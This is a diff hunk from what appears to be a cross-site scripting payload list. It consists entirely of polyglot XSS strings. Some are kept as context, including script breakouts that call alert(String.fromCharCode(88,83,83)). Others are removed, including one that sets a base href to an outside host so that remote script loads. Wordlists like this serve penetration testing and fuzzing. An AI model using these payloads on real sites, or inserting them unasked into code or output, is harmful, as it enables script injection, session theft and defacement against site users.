@@ -8,12 +8,3 @@ javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=aler
 ';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
 ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 “ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
-javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
-javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
-javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
-javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
-javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
-/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
-/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
---></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
-JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
